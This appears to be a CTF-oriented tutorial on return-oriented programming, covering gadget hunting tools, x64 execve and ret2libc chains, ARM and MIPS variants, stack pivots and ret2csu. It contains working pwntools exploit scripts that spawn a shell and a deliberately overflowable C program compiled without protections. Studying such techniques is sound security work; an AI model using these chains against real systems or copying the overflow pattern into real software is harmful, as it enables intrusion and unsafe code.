# Return-Oriented Programming (ROP)

## Overview

**Return-Oriented Programming (ROP)** is an advanced exploitation technique that chains together short instruction sequences (called "gadgets") ending in `ret` instructions to execute arbitrary code without injecting shellcode. This bypasses **NX/DEP** (Non-Executable stack/heap) protections.

---

## Why ROP?

### The Problem: NX/DEP

Modern systems mark stack and heap as **non-executable**:
```bash
$ checksec ./binary
NX: enabled  ← Cannot execute shellcode on stack!
```

### The Solution: Code Reuse

Instead of injecting code, **reuse existing code** in the binary/libc:
- Find small instruction sequences ("gadgets")
- Chain them together using return addresses
- Each gadget ends with `ret` (pops next address from stack)

---

## ROP Gadgets

### What is a Gadget?

A **gadget** is a short sequence of instructions ending in `ret`:

```asm
; Example gadgets
pop rdi; ret          ; Load argument into RDI
pop rsi; pop r15; ret ; Load two values
add rsp, 0x10; ret    ; Stack pivot
syscall; ret          ; Execute syscall
```

### Finding Gadgets

#### Using ROPgadget
```bash
# Find all gadgets
ROPgadget --binary ./vuln

# Find specific gadget
ROPgadget --binary ./vuln --only "pop|ret"

# Find syscall
ROPgadget --binary ./vuln --only "syscall"
```

#### Using ropper
```bash
ropper --file ./vuln --search "pop rdi"
ropper --file ./vuln --search "pop rsi; pop r15"
```

#### Using pwntools
```python
from pwn import *

binary = ELF('./vuln')
rop = ROP(binary)

# Find gadgets automatically
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

print(f"pop rdi; ret @ {hex(pop_rdi)}")
```

---

## ROP Chain Construction

### x64 Linux (System V ABI)

**Goal:** Call `execve("/bin/sh", NULL, NULL)`

**Requirements:**
- RDI = pointer to "/bin/sh"
- RSI = NULL
- RDX = NULL
- RAX = 59 (execve syscall number)

**Gadgets Needed:**
```asm
pop rdi; ret
pop rsi; ret (or pop rsi; pop r15; ret)
pop rdx; ret
pop rax; ret
syscall; ret
```

**ROP Chain:**
```python
from pwn import *

binary = ELF('./vuln')
rop = ROP(binary)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]

# Find "/bin/sh" string
binsh = next(binary.search(b'/bin/sh\x00'))

# Build ROP chain
payload = b"A" * offset  # Overflow to return address

# execve("/bin/sh", NULL, NULL)
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(binsh)        # "/bin/sh"
payload += p64(pop_rsi_r15)  # pop rsi; pop r15; ret
payload += p64(0)            # NULL (RSI)
payload += p64(0)            # junk (R15)
payload += p64(pop_rdx)      # pop rdx; ret
payload += p64(0)            # NULL (RDX)
payload += p64(pop_rax)      # pop rax; ret
payload += p64(59)           # execve syscall number
payload += p64(syscall)      # syscall; ret
```

**Stack Layout:**
```
High Memory
┌─────────────────────────────────────┐
│  Overflow padding ("AAAA...")       │
├─────────────────────────────────────┤
│  pop_rdi gadget address             │  ← Return address (RIP)
├─────────────────────────────────────┤
│  "/bin/sh" address                  │  ← Popped into RDI
├─────────────────────────────────────┤
│  pop_rsi_r15 gadget address         │  ← Next gadget
├─────────────────────────────────────┤
│  0x0000000000000000 (NULL)          │  ← Popped into RSI
├─────────────────────────────────────┤
│  0x0000000000000000 (junk)          │  ← Popped into R15
├─────────────────────────────────────┤
│  pop_rdx gadget address             │
├─────────────────────────────────────┤
│  0x0000000000000000 (NULL)          │  ← Popped into RDX
├─────────────────────────────────────┤
│  pop_rax gadget address             │
├─────────────────────────────────────┤
│  59 (execve syscall)                │  ← Popped into RAX
├─────────────────────────────────────┤
│  syscall gadget address             │  ← Executes syscall
└─────────────────────────────────────┘
```

---

## ret2libc (Classic ROP Technique)

### Concept

Call libc functions (like `system()`) without needing syscall gadgets.

### Requirements

1. **libc address** (leak via GOT or stack)
2. **"/bin/sh" string** (in libc or binary)
3. **pop rdi; ret** gadget

### Exploitation

```python
from pwn import *

binary = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak libc address (e.g., via puts@GOT)
# ... leak code here ...

libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

# Find pop rdi gadget
pop_rdi = ROP(binary).find_gadget(['pop rdi', 'ret'])[0]

# Build payload
payload = b"A" * offset
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(binsh_addr)   # "/bin/sh"
payload += p64(system_addr)  # system()
```

---

## Vulnerable Code Examples

### x86/x64 Vulnerable Binary

```c
// vuln_rop.c
#include <stdio.h>
#include <unistd.h>

void vulnerable() {
    char buffer[64];
    printf("Enter input: ");
    read(0, buffer, 200);  // Buffer overflow!
}

int main() {
    vulnerable();
    return 0;
}
```

**Compilation:**
```bash
# x64 with NX enabled (no PIE for easier exploitation)
gcc -o vuln_rop_x64 vuln_rop.c -no-pie -fno-stack-protector

# x86 version
gcc -o vuln_rop_x86 vuln_rop.c -no-pie -fno-stack-protector -m32
```

### Complete Exploit (x64)

```python
#!/usr/bin/env python3
"""
ROP Exploit for vuln_rop_x64
Technique: ret2libc using system()
"""

from pwn import *

# Configuration
binary = ELF('./vuln_rop_x64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = 'amd64'

# Start process
p = process(binary.path)

# Step 1: Leak libc address
# (Assuming we have a puts@GOT leak - simplified for demonstration)
# In real CTF, you'd leak via puts(puts@GOT) first

# For this example, we'll use a one-gadget or direct system call
rop = ROP(binary)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # For stack alignment

# Find "/bin/sh" in binary or use libc
try:
    binsh = next(binary.search(b'/bin/sh\x00'))
except StopIteration:
    # If not in binary, we need to leak libc first
    log.warning("No /bin/sh in binary, need libc leak")
    binsh = 0x0  # Placeholder

# Build ROP chain
offset = 72  # Adjust based on your binary

payload = b"A" * offset
payload += p64(ret)          # Stack alignment (important for system())
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(binsh)        # "/bin/sh"
payload += p64(binary.plt['system'])  # system@plt

# Send payload
p.sendlineafter(b"Enter input: ", payload)

# Get shell
p.interactive()
```

---

## ARM ROP

### ARM Gadgets

ARM uses **different return mechanism**:
- x86/x64: `ret` pops from stack into RIP
- ARM: `pop {pc}` or `bx lr` to return

**Common ARM Gadgets:**
```asm
pop {r0, pc}         ; Load R0 and return
pop {r0-r3, pc}      ; Load multiple registers
pop {r4, pc}         ; Load R4 and return
mov r0, sp; blx r4   ; Pivot stack
```

### ARM ROP Chain Example

```python
# ARM ROP to call system("/bin/sh")
from pwn import *

binary = ELF('./vuln_arm')
rop = ROP(binary)

# Find gadgets
pop_r0_pc = rop.find_gadget(['pop {r0, pc}'])[0]

# Build chain
payload = b"A" * offset
payload += p32(pop_r0_pc)        # pop {r0, pc}
payload += p32(binsh_addr)       # R0 = "/bin/sh"
payload += p32(system_addr)      # PC = system()
```

**Key Differences:**
- Use `p32()` instead of `p64()` (32-bit addresses)
- Arguments in R0-R3 (not stack)
- Return via PC register

---

## MIPS ROP

### MIPS Gadgets

MIPS uses **branch delay slots** and **jump register**:

```asm
jr $ra          ; Jump to return address
addiu $sp, 0x20 ; Branch delay slot (executes before jump!)
```

**Common MIPS Gadgets:**
```asm
lw $a0, 0x10($sp); jr $ra; nop   ; Load argument
move $t9, $s0; jalr $t9; nop     ; Call function
```

### MIPS ROP Considerations

1. **Branch Delay Slots:** Instruction after jump executes first!
2. **Arguments:** $a0-$a3 (like ARM R0-R3)
3. **Return:** `jr $ra` (jump to return address register)

```python
# MIPS ROP example (simplified)
payload = b"A" * offset
payload += p32(gadget1)      # lw $a0, 0x10($sp); jr $ra
payload += p32(0xdeadbeef)   # Padding
payload += p32(0xdeadbeef)   # Padding
payload += p32(0xdeadbeef)   # Padding
payload += p32(binsh_addr)   # Loaded into $a0
payload += p32(system_addr)  # Next gadget
```

---

## Advanced ROP Techniques

### 1. Stack Pivot

**Problem:** Limited stack space for ROP chain

**Solution:** Pivot stack to controlled memory (heap, BSS)

```asm
; x64 stack pivot gadget
xchg rsp, rax; ret   ; Swap RSP with RAX
mov rsp, rdi; ret    ; Set RSP to RDI
add rsp, 0x100; ret  ; Move stack pointer
```

### 2. One-Gadget

**Concept:** Single libc address that spawns shell

```bash
# Find one-gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Output:
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
```

**Usage:**
```python
one_gadget = libc_base + 0x4f3d5
payload = b"A" * offset + p64(one_gadget)
```

### 3. ret2csu (Universal Gadgets)

**Concept:** Use `__libc_csu_init` gadgets (present in all binaries)

```asm
; __libc_csu_init contains universal gadgets
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12+rbx*8]
```

**Use Case:** Control RDI, RSI, RDX without specific gadgets

---

## CTF Tips

### 1. Gadget Hunting Strategy

```bash
# Priority order:
1. pop rdi; ret (most important for x64)
2. pop rsi; pop r15; ret
3. pop rdx; ret
4. syscall; ret OR call system@plt
5. ret (for stack alignment)
```

### 2. Stack Alignment

**Modern libc requires 16-byte stack alignment:**
```python
# Add extra 'ret' gadget if system() fails
payload += p64(ret)  # Align stack
payload += p64(system_addr)
```

### 3. Debugging ROP Chains

```bash
gdb ./vuln
(gdb) break *vulnerable+XX  # Before return
(gdb) run < payload
(gdb) x/20gx $rsp  # Examine stack
(gdb) si  # Step through each gadget
```

---

## Practice Challenges

### Beginner: ret2win
```c
void win() { system("/bin/sh"); }
void vulnerable() { char buf[64]; gets(buf); }
```
**Goal:** Overflow to call `win()`

### Intermediate: ret2libc
**Goal:** Leak libc, calculate system(), call with "/bin/sh"

### Advanced: ret2csu
**Goal:** Use `__libc_csu_init` gadgets to control all registers

---

## Further Reading

- [ROP Emporium](https://ropemporium.com/) - Practice challenges
- [ROPgadget Documentation](https://github.com/JonathanSalwan/ROPgadget)
- [Pwntools ROP Module](https://docs.pwntools.com/en/stable/rop/rop.html)
- [ARM ROP Techniques](https://azeria-labs.com/rop-chaining-on-arm/)

---

**Next:** [JOP (Jump-Oriented Programming)](../JOP/) | [SROP](../SROP/)
